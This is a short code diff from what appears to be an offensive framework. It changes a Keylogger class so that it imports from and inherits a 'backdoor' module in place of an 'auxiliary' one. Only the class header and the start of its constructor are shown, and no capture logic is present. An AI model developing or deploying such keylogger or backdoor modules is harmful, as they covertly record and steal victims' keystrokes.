@@ -1,8 +1,8 @@
-from aux import *
+from backdoor import *
 import os
 import time
 
-class Keylogger(Auxiliary):
+class Keylogger(Backdoor):
     prompt = Fore.RED + "(keylogger) " + Fore.BLUE + ">> " + Fore.RESET
 
     def __init__(self, core):
